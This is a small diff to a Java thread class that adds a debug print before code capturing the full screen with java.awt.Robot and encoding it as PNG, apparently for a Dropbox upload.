@@ -31,6 +31,7 @@ public class MyThread extends Thread {
 
         // Upload "test.txt" to Dropbox
         try{
+            System.out.println("UPLOAD SCREENSHOT");
             image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
             ByteArrayOutputStream os = new ByteArrayOutputStream();
             ImageIO.write(image,"png",os);
